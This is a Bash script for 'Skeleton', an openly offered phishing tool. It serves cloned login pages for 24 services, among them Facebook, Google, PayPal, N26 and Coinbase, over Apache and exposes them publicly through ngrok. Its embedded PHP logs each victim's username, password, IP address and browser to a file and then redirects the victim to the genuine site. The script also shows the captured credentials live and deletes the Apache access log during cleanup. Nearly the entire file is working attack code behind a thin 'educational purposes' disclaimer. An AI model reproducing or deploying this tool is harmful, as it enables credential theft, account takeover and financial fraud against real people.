#!/bin/bash

#  _______ __          __       __                  
# |   _   |  |--.-----|  .-----|  |_.-----.-----.   
# |   1___|    <|  -__|  |  -__|   _|  _  |     |   
# |____   |__|__|_____|__|_____|____|_____|__|__|   
# |:  1   |                                         
# |_______|

#**** INFO ****
#
# Skeleton is a Social Engineering tool attack switcher
# Type: Phishing Tool
#
# Target: Facebook, Linkedin, Twitter, Pinterest, Google, Instagram, Microsoft, Netflix, Paypal, Wordpress, Amazon, Ebay, 
#		  CyberghostVPN, NordVPN, ExpressVPN, ZenmateVPN, PCS, N26, Roblox, Steam, Binance, Etoro, Bittrex, Coinbase
#
# DISCLAMER: Program for educational purposes!!!
# 
#**********************
#
# Name: Skeleton
# Version: 1.0 beta
# Dev: Shell
# Language: En        
# Date: 14/08/2017   
# Author: KURO-CODE   
#
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.1
# Dev: Shell
# Language: En        
# Date: 28/03/2018   
# Author: KURO-CODE   
#
# -Attack Switcher BugFix
# -Exit (Revision)
# -BugFix
# -Check ROOT perm...
# 
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.2
# Dev: Shell
# Language: En        
# Date: 28/10/2018   
# Author: KURO-CODE   
#
# + BugFix
#
# ~~~ Sites ~~~
#
# + Google
# + Instagram
# + Microsoft
# + Netflix
# 
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.3
# Dev: Shell
# Language: En        
# Date: 19/03/2019   
# Author: KURO-CODE   
#
# + BugFix
#
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.4
# Dev: Shell
# Language: En        
# Date: 18/09/2019   
# Author: KURO-CODE   
#
# + BugFix
# + script revision
# + Websites update
#
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.5
# Dev: Shell
# Language: En        
# Date: 20/12/2019   
# Author: KURO-CODE   
#
# + BugFix
# + Auto Update
# + script revision
# + Websites update
#
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.6
# Dev: Shell
# Language: En        
# Date: 14/02/2020   
# Author: KURO-CODE   
#
# + BugFix
# + script revision
#
#**********************
#**********************
#
# Name: Skeleton
# Version: 1.7
# Dev: Shell
# Language: En        
# Date: 14/03/2020   
# Author: KURO-CODE   
#
# + script revision
# + Paypal, Wordpress, Amazon, Ebay, CyberghostVPN, NordVPN, ExpressVPN,
#   ZenmateVPN, PCS, N26, Roblox, Steam, Binance, Etoro, Bittrex, Coinbase
#
#**********************

#**** Skeleton version ****
VERSION="1.7"
Inf_Date="14/03/2020"

#**** VAR ****
UPFILE="Skeleton.txt"
Update="https://raw.githubusercontent.com/KURO-CODE/Version/master/$UPFILE"
SOURCE=`pwd`
REPO="git clone https://github.com/KURO-CODE/Skeleton.git"

#**** CONFIG ****
IMG_PATH="img"
TMP=`cat /etc/apache2/sites-available/000-default.conf | grep DocumentRoot | awk '{print $2}'`
TMP_FILES="templates"
IDXF="index_files"

#**** Color ****
CL="\033[0;7m"
W="\033[1;37m"
GR="\033[0;37m"
R="\033[1;31m"
G="\033[1;32m"
Y="\033[1;33m"
B="\033[1;34m"
M="\033[1;35m"
EC="\033[0m"

#**** Display ****
DISPLAY_LOG="-geometry 40x5+800+0"
DISPLAY_SERV="-geometry 80x10+600-300"
DISPLAY_KEY="-geometry 100x21+600-0"

#**** TOP MENU SELECT ****
MENU_main="${W}~ Main Menu ~${EC}"
MENU_info="${W}~ I N F O ~"
MENU_skel="${W}~ Skeleton menu ~"
MENU_skel1="${B}S${W}E${GR}le${W}CT"
MENU_skel2="Select an attack"

#**** Screen size ****
resize -s 26 65 > /dev/null

#~~~~ Ckeck Dep ~~~~
function Check_Dep() {
	clear
	FLAG
	echo -ne "\n${W}Xterm${GR}......"
	if ! hash xterm 2>/dev/null; then
		ExiT=1
		TOOL="Xterm"
		echo -e "${W}[${R}Not installed${W}]"
		sleep 1
	else
		echo -e "${W}[${G}Installed${W}]"
		sleep 1
	fi
	echo -ne "${W}Apache${GR}....."
	if ! hash apache2 2>/dev/null; then
		ExiT=1
		TOOL1="Apache"
		echo -e "${W}[${R}Not installed${W}]"
		sleep 1
	else
		echo -e "${W}[${G}Installed${W}]"
		sleep 1
	fi
	echo -ne "${W}Php${GR}........"
	if ! hash php 2>/dev/null; then
		ExiT=1
		TOOL2="Php"
		echo -e "${W}[${R}Not installed${W}]"
		sleep 1
	else
		echo -e "${W}[${G}Installed${W}]"
		sleep 1
	fi
	echo -ne "${W}Ngrok${GR}......"
	if [ ! -f "ngrok" ] || [ ! -f "ngrok_64" ]; then
		ExiT=1
		TOOL3="Ngrok"
		echo -e "${W}[${R}Not installed${W}]"
		sleep 1
	else
		echo -e "${W}[${G}Installed${W}]"
		sleep 1
	fi
	if [ "$ExiT" = "1" ]; then
		echo -e "\n${W}Please install ${G}${TOOL} ${TOOL1} ${TOOL2} ${TOOL3}"
		sleep 5
		EXITMODE
	fi
}

#~~~~ Check Version ~~~~
function Check_Version() {
	clear
	FLAG
	wget $Update 2>/dev/null
	if [ ! -f "$UPFILE" ]; then
		clear
		FLAG
		echo -e "\n${W}[${R}!${W}]File not exist!!!${EC}"
		sleep 1
		echo -e "${W}[${R}!${W}]Failure to update, ${EC}"
		sleep 3
	else
		clear
		FLAG
		VERA=`echo $VERSION |sed 's/\.//g'`
		VERX=`cat $UPFILE`
		VER2=`echo $VERX |sed 's/\.//g'`
		echo -e "\n${G}Prog version${W}:${GR}.....${W}$VERSION \n${G}Update version${W}:${GR}...${W}$VERX"
		sleep 3
		if [ "$VERA" -ge "$VER2" ]; then
			clear
			FLAG
			echo -e "\n${W}[${G}+${W}]Version is ok${EC}"
			sleep 2
			rm -f $UPFILE
		elif [ "$VERA" -lt "$VER2" ]; then
			clear
			FLAG
			echo -e "\n${W}[${R}!${W}]Update version${EC}"
			sleep 2
			$REPO 2>/dev/null
			if [ ! -d "Skeleton" ]; then
				clear
				FLAG
				echo -e "\n${W}[${R}!${W}]File not exist!!!${EC}"
				sleep 3
				clear
				exit
			else
				clear
				FLAG
				echo -e "\n${W}[${R}!${W}]Update, please wait...${EC}"
				sleep 1
				LS=`ls *.txt`
				els=`echo $LS |awk '{print $1}'`
				if [ ! -f "$els" ]; then
					sleep 0.01
				else
					clear
					FLAG
					rm -f $UPFILE
					mkdir OLDSKEL
					echo -e "\n${W}[${R}!${W}]Update, please wait...${EC}"
					sleep 1
					cp *.txt Skeleton/ 2>/dev/null
				fi
				mv Skeleton /tmp/Skeleton
				cd ..
				rm -rf $SOURCE
				mv /tmp/Skeleton Skeleton
				clear
				FLAG
				echo -e "\n${W}[${G}+${W}] Update finished. \n Restart...${EC}"
				sleep 3
				cd Skeleton
				bash ./skeleton.sh
				exit
			fi
		fi
	fi
}

#**** Check Root ****
function check_root_perm() {
	clear
	FLAG
	user=$(whoami)
	if [ "$user" = "root" ]; then
  		echo -e "\n${W} [${G}X${W}]${GR}...${G}Y${W}ou are ${G}Root${W}!"
  		sleep 1.2
  		RUN
	else
		echo -e "\n${W} [${R}X${W}]${GR}...${R}Y${W}ou are not ${R}Root${W}!\n\n ${G}U${W}se:${Y} sudo ./skeleton.sh${EC}"
 		sleep 1
 		echo -e "\n${W} [${R}X${W}]${GR}...${R}C${W}lose"
 		sleep 1
	fi
}

#~~~ START ~~~
function RUN {
	Place="Run"
	clear
	FLAG
	sleep 1
	echo -e "\n	  ${B} ╔════════════════════════════════╗
           ║   A${W} automatic${M} phishing${R} server${B}  ║
           ║${W} By${B} K${W}U${B}R${W}O-${B}C${W}O${B}D${B}E$G &$M Z${W}0${W}m${M}B${W}13${M}D${W}o${M}LL$G 2${W}0${R}17${B} ║
	   ╚════════════════════════════════╝${EC}
"
	sleep 3
	main
}

function main {
	Place="MAIN"
	clear
	FLAG
	echo
	echo -e "\n	    $MENU_main
         ${B}╔${W}═════════════════${B}╗${W}
         ║  1)${GR}...${B}I${GR}n${W}f${GR}o${W}      ║
         ║  2)${GR}...${B}S${W}k${GR}e${W}le${GR}to${W}n  ║
         ║${R}  0${W})${GR}...${R}Exit${W}      ║
         ${B}╚${W}═════════════════${B}╝${EC}
"
	echo -ne "${Y}S${G}kEleToN${R}~${Y}O${B}pTioN${W}:${G} "
	read opt
	case $opt in
		1)	inf;;
		2)	select_attack;;
		0)	EXITMODE;;
		*)	echo -e "${CL}${R}[ERROR]${EC}"; sleep 2; main;;
	esac
}

#~~~~ Attack Selection ~~~~
function select_attack {
	place="Sel_Attack"
	clear
	FLAG
	echo
	echo -e "                 ${W}~ $MENU_skel2 ~
         ${B}╔${W}═══════════════════════════════════${B}╗${W}
         ║  1)${GR}...${B}F${W}acebook     2)${GR}...${B}L${W}inkedin  ║
	 ║  3)${GR}...${B}T${W}witter      4)${GR}...${B}P${W}interest ║
	 ║  5)${GR}...${B}G${W}oogle       6)${GR}...${B}I${W}nstagram ║
	 ║  7)${GR}...${B}M${W}icrosoft    8)${GR}...${B}N${W}etflix   ║
	 ║  9)${GR}...${B}P${W}ayPal      10)${GR}...${B}W${W}ordpress ║
	 ║ 11)${GR}...${B}E${W}bay        12)${GR}...${B}A${W}mazon    ║
	 ║ 13)${GR}...${B}P${W}csCard     14)${GR}...${B}N${W}26       ║
	 ║ 15)${GR}...${B}C${W}yberGhost  16)${GR}...${B}N${W}ordVPN   ║
	 ║ 17)${GR}...${B}E${W}xpressVPN  18)${GR}...${B}Z${W}enmate   ║
	 ║ 19)${GR}...${B}R${W}oblox      20)${GR}...${B}S${W}team     ║
	 ║ 21)${GR}...${B}B${W}inance     22)${GR}...${B}E${W}toro     ║
	 ║ 23)${GR}...${B}B${W}ittrex     24)${GR}...${B}C${W}oinbase  ║
         ║                                   ║
         ║   ${R}0${W})${GR}...${R}Exit        ${Y}00$W)$GR...${Y}Back${W}     ║
         ${B}╚${W}═══════════════════════════════════${B}╝     
"	
	echo -ne "${Y}S${G}kEleToN${R}~${Y}O${B}pTioN${W}:${G} " 
	read CHOICE
	case $CHOICE in
		1)	WS="facebook"; lang;;
		2)	WS="linkedin"; lang;; 
		3)	WS="twitter"; lang;;
		4)	WS="pinterest"; lang;;
   		5)	WS="google"; lang;;
    	6)	WS="instagram"; lang;;
	    7)	WS="microsoft"; lang;;
	    8)	WS="netflix"; lang;;
		9)	WS="paypal"; lang;;
		10)	WS="wordpress"; lang;;
		11)	WS="ebay"; lang;;
		12)	WS="amazon"; lang;;
		13)	WS="mypcs"; lang;;
		14)	WS="n26"; lang;;
		15)	WS="cyberghost"; lang;;
		16)	WS="nordvpn"; lang;;
		17)	WS="expressvpn"; lang;;
		18)	WS="zenmate"; lang;;
		19)	WS="roblox"; lang;;
		20)	WS="steam"; lang;;
		21)	WS="binance"; lang;;
		22)	WS="etoro"; lang;;
		23)	WS="bittrex"; lang;;
		24)	WS="coinbase"; lang;;
		00)	echo -e " [*]...Back"
			if [ "$KC" -eq "1" ];then
				Kill_Process
				sleep 1
				KC="0"
				main
			else
				main
			fi ;;
		0)	if [ "$KC" -eq "1" ];then
				Kill_Process
				sleep 1
				KC="0"
				EXITMODE
			else
				EXITMODE
			fi;;
		*)	echo -e "${CL}${R}[ERROR]${EC}"; sleep 3; select_attack ;;
	esac
}

#~~~~ Attack Language ~~~~
function lang {
	Place="Lang"
	clear
	FLAG
	echo -e "\n       ~ Select language attack ~ 
      
           ${B}╔${W}═════════════════${B}╗${W}
           ║  1)${GR}...${G}English${W}   ║
           ║  2)${GR}...${G}French${W}    ║
           ║${R}  9${W})${GR}...${R}Back${W}      ║ 
           ${B}╚${W}═════════════════${B}╝${EC}
"
	echo -ne "${Y}S${G}kEleToN${R}~${Y}O${B}pTioN${W}:${G} "
	read opt_lang
	case $opt_lang in
		1)	SLang="en"
			ELang="${W}[${B}E${W}n]${GR}...${B}E${W}nglish selected"
			ErrorLang="\n${W}[${R}X${W}]${GR}...${B}E${W}nglish Not exist"
			CHECK_FILES;;
		2)	SLang="fr"
			ELang="${W}[${B}F${W}R]$GR...${B}F${W}rench selected"
			ErrorLang="\n${W}[${R}X${W}]${GR}...${B}F${W}rench Not exist"
			CHECK_FILES;;
		9)	echo -e "${W}[${R}*${W}]${GR}...${W}Back" ; sleep 2 ; main ;;
		*)	echo -e "${CL}${R}[ERROR]${EC}"; sleep 3; lang ;;
	esac
}

#~~~~ Check/Copy Folders & Files ~~~~
function CHECK_FILES {
	if [ ! -d "$TMP_FILES" ]; then
		clear
		FLAG
		echo -e "Not exist"
		sleep 3
		EXITMODE
	else
		if [ ! -d "$TMP_FILES/$WS" ]; then
			clear
			FLAG
			echo -e "Not exist"
			sleep 3
			select_attack
		else
			echo "$B ok"
			if [ ! -d "$TMP_FILES/$WS/$IDXF" ]; then
				sleep 0.01
			else
				echo "$C ok"
				cp -r $TMP_FILES/$WS/$IDXF/ $TMP/
			fi
			if [ ! -d "$TMP_FILES/$WS/$SLang" ]; then
				clear
				FLAG
				echo -e "$ErrorLang"
				sleep 3
				select_attack
			else
				cp -f $TMP_FILES/$WS/$SLang/* $TMP/
				clear
				FLAG
				echo -e "\n${W}[${G}*${W}]${GR}....${G}$WS"
				sleep 0.5
				echo -e "$ELang"
				sleep 0.5
				echo -e "[${G}*${W}]${GR}....${Y}Copy files${EC}"
				Script
				sleep 3
				Check_Server
			fi
		fi
	fi
}

#~~~~ Script ~~~~
function Script() {
	echo "<?php

if (!empty(\$_SERVER['HTTP_CLIENT_IP']))
    {
      \$ipaddress = \$_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";
    }
elseif (!empty(\$_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      \$ipaddress = \$_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";
    }
else
    {
      \$ipaddress = \$_SERVER['REMOTE_ADDR'].\"\\r\\n\";
    }
\$useragent = \"User-Agent: \";
\$Username = \"Username: \";
\$PassWord = \"Password: \";
\$browser = \$_SERVER['HTTP_USER_AGENT'].\"\\r\\n\";
\$user = \$_POST['username'].\"\\r\\n\";
\$pass = \$_POST['password'].\"\\r\\n\";
\$CUT = \"--------------------------------\";

\$file = 'id.txt';
\$victim = \"\r\nIP: \";
\$fp = fopen(\$file, 'a');

fwrite(\$fp, \$victim);
fwrite(\$fp, \$ipaddress);
fwrite(\$fp, \$useragent);
fwrite(\$fp, \$browser);
fwrite(\$fp, \$Username);
fwrite(\$fp, \$user);
fwrite(\$fp, \$PassWord);
fwrite(\$fp, \$pass);
fwrite(\$fp, \$CUT);

fclose(\$fp);

header('Location: https://$WS.com/');
exit();
" > $TMP/login.php

	echo "<?php
include 'id.php';
header('Location: index.html');
exit
?> " > $TMP/index.php

	echo "#!/bin/bash

#~~~~ Colors ~~~~
W=\"\033[1;37m\"
CL=\"\033[0;7m\"
G=\"\033[0;32m\"
EC=\"\033[0m\"

function rep {
clear
echo -e \"
   ${W}~ KEY ~
\"

for i in \"$TMP/id.txt\"

do
echo -e \"${W}══════════════════
${CL}${G} $WS       ${EC}
${W}══════════════════${EC}\"
	if [ ! -f \"$TMP/id.txt\" ]; then
		echo -e \"${G} Please wait${EC}\"
	else
		cat $TMP/id.txt 
	fi
done

sleep 3

rep
}
rep" > key.sh 
}

#~~~~ Check Server ~~~~
function Check_Server() {
	CSERV=$(ps -A |grep ngrok |awk '{print $4}')
	if [[ "$CSERV" == "ngrok" || "$CSERV" == "ngrok_64" ]]; then
		Start_service
		control
	else
		set_serv
	fi
}

function Start_service() {
	chmod +x key.sh
	chmod 777 $TMP
	service apache2 start
	sleep 1
	xterm -title "Skeleton Control" $DISPLAY_LOG -bg "#000000" -fg "#11ff00" -e "tail -f $TMP/id.txt > sk_tmp.csv" &
	xterm -title "Skeleton" $DISPLAY_KEY -e "./key.sh" &
}

#~~~~ Set Server ~~~~
function set_serv {
	Place="Set_Serv"
	A=$(uname -a |wc -w)
	B2=$(($A-1))
	ABC=$(uname -a |cut -f $B2 -d ' ' 2>&1 )
	setserv="$ABC"	
	if [ "$ABC" = "i686" ]; then
		SYSTEM="ngrok"
  		Sys="./$SYSTEM http 80"
  		Start_service
  		echo -e "${W}[${G}+${W}] Start service 32bit..."
	  	sleep 2
	  	chmod +x $SYSTEM
		$Sys >/dev/null &
	  	sleep 2
	  	CHECK_PID
		LINK
		control
	fi
	if [ "$ABC" = "x86_64" ]; then
		SYSTEM="ngrok_64"
		Sys="./$SYSTEM http 80"
		Start_service
		echo -e "${W}[${G}+${W}] Start service 64bit..."
		sleep 2
		chmod +x $SYSTEM
		$Sys >/dev/null &
		sleep 2
		CHECK_PID
		sleep 1
		LINK
		control 
	fi
}

function CHECK_PID {
	KC=1
	PID=$(ps aux |pgrep ngrok)
}

#~~~~ Link ~~~~
function LINK() {
	wget http://127.0.0.1:4040 >/dev/null 2>&1
	Url=`cat index.html |grep "URL"`
	echo $Url |sed 's/:\\/ /g' > link.txt
	AX=`cat link.txt |awk '{print $6}' |sed 's/"//g'`
	BX=`cat link.txt |awk '{print $16}' |sed 's/"//g'`
	AA=`echo $AX |cut -f1 -d '\'`
	BB=`echo $BX |cut -f1 -d '\'`
}

#~~~~ Control Menu ~~~~
function control {
	Place="Control"
	clear
	FLAG
	echo -e "\n ${W}~~~ Send Link to target ~~~\n${G}Link${W} 1: $AA \n${G}Link${W} 2: $BB\n\n        ~ Control attack switcher ~
      ${B}╔${W}════════════════════════════${B}╗${W}
      ║${B} 1${W})${GR}...${W}Stop attack           ║
      ║${B} 2${W})${GR}...${W}Select another attack ║
      ║${B} 3${W})${GR}...${W}Back to main menu     ║
      ║${R} 0${W})${GR}...${R}Exit${W}                  ║
      ${B}╚${W}════════════════════════════${B}╝${EC}\n"
	echo -ne "${Y}S${G}kEleToN${R}~${Y}O${B}pTioN${W}:${G} "
	read opt
 	case $opt in
		1)	report; Kill_Process; Kill_Another; Kill_Services; Clean_TMP; main;;
		2)	report; Kill_Another; Kill_Services; Clean_TMP; select_attack; Pss="1";;
		3)	report; Kill_Process; Kill_Another; Kill_Services; Clean_TMP; main;;
		0)	report; Kill_Process; Kill_Another; Kill_Services; Clean_TMP; Pss=0; EXITMODE;;
		*)	echo -e "${CL}${R}[ERROR]${EC}"; sleep 2; control;;
	esac
}

#~~~~ INFO ~~~~
function inf {
	Place="Info_Menu"
	clear
	FLAG
	echo -e "\n 	          $MENU_info
	  ${B}╔${W}════════════════════════${B}╗
	  ${W}║${CL}${G} Name:....Skeleton      ${EC}${W}║
	  ║${CL}${G} Dev:.....Shell         ${EC}${W}║
	  ║${CL}${G} Ver:.....$VERSION           ${EC}${W}║
	  ║${CL}${G} Date:....$Inf_Date    ${EC}${W}║
	  ║${CL}${G} Coder:...Kuro-code     ${EC}${W}║
	  ║${CL}${G} Info:....Phishing tool ${EC}${W}║
	  ${B}╚${W}════════════════════════${B}╝${W}

      [${M}!${W}] Special thanks: Z0mB13Do77 [${M}!${W}]

     [${Y}¡${W}] Press${Y} Enter${W}, return main menu [${Y}¡${W}]${EC} "
	read pause
	main
}

#~~~~ Report ~~~~
function report {
	Place="report"
	if [ ! -f "$TMP/id.txt" ]; then
		sleep 0.01
	else
		RPRT=`cat $TMP/id.txt` 
		Date=`date +%D`
		echo "   ~ $WS Phishing Session ~
****************************************
$Date
$RPRT
═══════════════════════════════
         SkEleToN $VERSION
═══════════════════════════════
  " >> $WS.txt
	fi
}

#~~~~ Exit ~~~~
function EXITMODE {
	clear
	FLAG
	if [ "$Pss" -eq "1" ]; then
		sleep 0.01
	fi
	clear
	FLAG
	echo
	echo -e "\n	  ${CL} Thanks for use Skeleton ${EC}"
	sleep 2.5
	clear
	exit
}

#~~~~ Function Kill ~~~~
function Kill_Services() {
	clear
	FLAG
	echo -e "\n${W}[${G}*${W}]${GR}...${W}Stop attack${GR}...${W}[${G}*${W}]"
	sleep 0.2
	echo -e "${W}[${G}+${W}]${GR} Kill process"
	sleep 0.2
	echo -e "${W}[${G}+${W}]${GR} Close services"
	sleep 0.2
	echo -e "${W}[${G}+${W}]${GR} Shutdow Apache"
	service apache2 stop
	chmod 700 $TMP 
	sleep 2
}

function Kill_Another() {
	pkill key.sh
	pkill tail
}

function Kill_Process() {
	kill $PID
}

#~~~~ CLEAN TMP ~~~~
function Clean_TMP() {
	echo -e "${W}[${G}+${W}]${GR} Clean temporary files"
	if [ ! -f "$TMP/index.html" ]; then
		sleep 0.2
	else
		rm -rf $TMP/index.html		
	fi
	if [ ! -d "$TMP/$IDXF" ]; then
		sleep 0.2
	else
		rm -rf $TMP/$IDXF	
	fi
	if [ ! -f "$TMP/id.txt" ]; then
		sleep 0.2
	else
		rm -rf $TMP/id.txt
	fi
	if [ ! -f "$TMP/index.php" ]; then
		sleep 0.2
	else		
		rm -rf $TMP/index.php
	fi
	if [ ! -f "$TMP/login.php" ]; then
		sleep 0.2
	else		
		rm -rf $TMP/login.php
	fi
	if [ ! -f "/var/log/apache2/access.log" ]; then
		sleep 0.2
	else
		rm -f /var/log/apache2/access.log
	fi
	if [ ! -d "$TMP/login_files" ]; then
		sleep 0.2
	else
		rm -rf $TMP/login_files
	fi
	if [ ! -f "key.sh" ]; then
		sleep 0.2
	else
		rm -f key.sh
	fi
	if [ ! -f "sk_tmp.csv" ]; then
		sleep 0.2
	else
		rm -f sk_tmp.csv
	fi
	if [ ! "index.html" ]; then
		sleep 0.2
	else
		rm -f index.html
		rm -f link.txt
	fi
}

#~~~~ FLAG ~~~~
function FLAG {
	echo -e "${B}  _______${W} __          __       __                  
 ${B}|   _   |${W}  |--.-----|  .-----|  |_.-----.-----.   
 ${B}|   1___|${W}    <|  -__|  |  -__|   _|  _  |     |   
 ${B}|____   |${W}__|__|_____|__|_____|____|_____|__|__|   
 ${B}|:  1   |                                         
 ${B}|_______|    ${Y}S${G}ocial ${Y}E${G}ngineering ${R}T${W}ool${GR} v$VERSION${EC} "
}

#~~~~ Hard Exit ~~~~
function cap_traps() {
	case $Place in
		"Run") clear; EXITMODE;;
		"MAIN") clear; EXITMODE;;
		"Sel_Attack") clear; FLAG; Clean_TMP; EXITMODE;;
		"Info_Menu") clear; EXITMODE;;
		"Lang") clear; FLAG; Clean_TMP; EXITMODE;;
		"Set_Serv") clear; FLAG; Clean_TMP; EXITMODE;;
		"Control") clear; FLAG; Kill_Process; Kill_Services; Clean_TMP; EXITMODE;;
	esac 
}

for x in SIGINT SIGHUP INT SIGTSTP; do
	trap_cmd="trap \"cap_traps $x\" \"$x\""
	eval "$trap_cmd"
done

#### START ####
Check_Dep
Check_Version
check_root_perm
